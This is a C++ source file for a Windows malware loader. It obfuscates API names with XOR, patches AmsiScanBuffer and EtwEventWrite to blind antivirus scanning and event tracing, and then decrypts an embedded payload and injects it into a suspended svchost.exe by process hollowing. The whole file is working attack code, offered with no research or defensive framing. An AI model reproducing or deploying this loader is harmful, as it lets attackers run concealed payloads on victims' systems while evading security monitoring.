#include <windows.h>
#include "payload.h"

// Simple compile-time XOR string obfuscation to hide API names
template <size_t N, char K>
struct XorStr {
    char data[N];
    constexpr XorStr(const char(&str)[N]) {
        for (size_t i = 0; i < N; i++) {
            data[i] = str[i] ^ K;
        }
    }
    char* decrypt() {
        for (size_t i = 0; i < N; i++) {
            data[i] ^= K;
        }
        return data;
    }
};
#define X(str) (XorStr<sizeof(str), 0x5A>(str).decrypt())

// Function Pointers for APIs
typedef LPVOID(WINAPI* fnVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* fnWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef BOOL(WINAPI* fnGetThreadContext)(HANDLE, LPCONTEXT);
typedef BOOL(WINAPI* fnSetThreadContext)(HANDLE, const CONTEXT*);
typedef DWORD(WINAPI* fnResumeThread)(HANDLE);
typedef BOOL(WINAPI* fnCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);

void PatchAMSI() {
    HMODULE hAmsi = LoadLibraryA(X("amsi.dll"));
    if (!hAmsi) return;
    void* pAmsiScanBuffer = (void*)GetProcAddress(hAmsi, X("AmsiScanBuffer"));
    if (!pAmsiScanBuffer) return;
    DWORD oldProtect;
    VirtualProtect(pAmsiScanBuffer, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
    const byte patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    memcpy(pAmsiScanBuffer, patch, sizeof(patch));
    VirtualProtect(pAmsiScanBuffer, 5, oldProtect, &oldProtect);
}

void PatchETW() {
    HMODULE hNtdll = GetModuleHandleA(X("ntdll.dll"));
    if (!hNtdll) return;
    void* pEtwEventWrite = (void*)GetProcAddress(hNtdll, X("EtwEventWrite"));
    if (!pEtwEventWrite) return;
    DWORD oldProtect;
    VirtualProtect(pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    *(byte*)pEtwEventWrite = 0xC3;
    VirtualProtect(pEtwEventWrite, 1, oldProtect, &oldProtect);
}

int main() {
    PatchAMSI();
    PatchETW();

    // Resolve APIs dynamically
    HMODULE hKernel32 = GetModuleHandleA(X("kernel32.dll"));
    fnVirtualAllocEx pVirtualAllocEx = (fnVirtualAllocEx)GetProcAddress(hKernel32, X("VirtualAllocEx"));
    fnWriteProcessMemory pWriteProcessMemory = (fnWriteProcessMemory)GetProcAddress(hKernel32, X("WriteProcessMemory"));
    fnGetThreadContext pGetThreadContext = (fnGetThreadContext)GetProcAddress(hKernel32, X("GetThreadContext"));
    fnSetThreadContext pSetThreadContext = (fnSetThreadContext)GetProcAddress(hKernel32, X("SetThreadContext"));
    fnResumeThread pResumeThread = (fnResumeThread)GetProcAddress(hKernel32, X("ResumeThread"));
    fnCreateProcessA pCreateProcessA = (fnCreateProcessA)GetProcAddress(hKernel32, X("CreateProcessA"));

    // Decrypt payload in memory
    byte* decPayload = (byte*)VirtualAlloc(NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (unsigned int i = 0; i < payload_size; i++) {
        decPayload[i] = payload[i] ^ payload_key;
    }

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    char szTarget[] = "C:\\Windows\\System32\\svchost.exe";
    
    char* cmdLine = GetCommandLineA();
    char cmdLineCopy[1024];
    for(int i = 0; i < 1024; i++) {
        cmdLineCopy[i] = cmdLine[i];
        if(cmdLine[i] == '\0') break;
    }
    
    if (pCreateProcessA(szTarget, cmdLineCopy, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        CONTEXT ctx;
        ctx.ContextFlags = CONTEXT_FULL;
        pGetThreadContext(pi.hThread, &ctx);

        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)decPayload;
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)decPayload + dosHeader->e_lfanew);

        void* pImageBase = pVirtualAllocEx(pi.hProcess, (void*)ntHeaders->OptionalHeader.ImageBase, 
                                        ntHeaders->OptionalHeader.SizeOfImage, 
                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        
        if (!pImageBase) {
            pImageBase = pVirtualAllocEx(pi.hProcess, NULL, ntHeaders->OptionalHeader.SizeOfImage, 
                                      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        }

        // Map image into local memory first
        byte* localImage = (byte*)VirtualAlloc(NULL, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        memcpy(localImage, decPayload, ntHeaders->OptionalHeader.SizeOfHeaders);
        
        PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)ntHeaders + sizeof(IMAGE_NT_HEADERS));
        for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            if (sectionHeader[i].SizeOfRawData > 0) {
                memcpy((void*)((DWORD_PTR)localImage + sectionHeader[i].VirtualAddress),
                       (void*)((DWORD_PTR)decPayload + sectionHeader[i].PointerToRawData),
                       sectionHeader[i].SizeOfRawData);
            }
        }

        // Apply Base Relocations if loaded at a different address
        DWORD_PTR delta = (DWORD_PTR)pImageBase - ntHeaders->OptionalHeader.ImageBase;
        if (delta != 0) {
            IMAGE_DATA_DIRECTORY relocDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
            if (relocDir.Size > 0 && relocDir.VirtualAddress > 0) {
                IMAGE_BASE_RELOCATION* reloc = (IMAGE_BASE_RELOCATION*)((DWORD_PTR)localImage + relocDir.VirtualAddress);
                while (reloc->VirtualAddress != 0) {
                    DWORD numEntries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                    WORD* relocData = (WORD*)((DWORD_PTR)reloc + sizeof(IMAGE_BASE_RELOCATION));
                    for (DWORD i = 0; i < numEntries; i++) {
                        if ((relocData[i] >> 12) == IMAGE_REL_BASED_DIR64) {
                            DWORD_PTR* patchAddr = (DWORD_PTR*)((DWORD_PTR)localImage + reloc->VirtualAddress + (relocData[i] & 0xFFF));
                            *patchAddr += delta;
                        }
                    }
                    reloc = (IMAGE_BASE_RELOCATION*)((DWORD_PTR)reloc + reloc->SizeOfBlock);
                }
            }
        }

        // Write the fully mapped and relocated image to target process
        pWriteProcessMemory(pi.hProcess, pImageBase, localImage, ntHeaders->OptionalHeader.SizeOfImage, NULL);
        VirtualFree(localImage, 0, MEM_RELEASE);

        pWriteProcessMemory(pi.hProcess, (void*)(ctx.Rdx + 16), &pImageBase, sizeof(pImageBase), NULL);

        ctx.Rcx = (DWORD_PTR)pImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
        pSetThreadContext(pi.hThread, &ctx);
        pResumeThread(pi.hThread);
    }

    memset(decPayload, 0, payload_size);
    VirtualFree(decPayload, 0, MEM_RELEASE);

    return 0;
}
